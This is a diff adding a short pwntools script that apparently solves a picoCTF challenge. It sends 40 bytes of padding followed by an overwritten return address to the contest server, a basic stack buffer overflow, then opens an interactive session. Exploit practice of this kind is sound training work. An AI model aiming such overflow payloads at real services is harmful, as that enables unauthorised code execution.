@@ -1,0 +1,9 @@
+from pwn import *
+
+p = remote("mysterious-sea.picoctf.net", 50009)
+
+payload = b"A" * 40
+payload += p64(0x401256)
+
+p.sendline(payload)
+p.interactive()
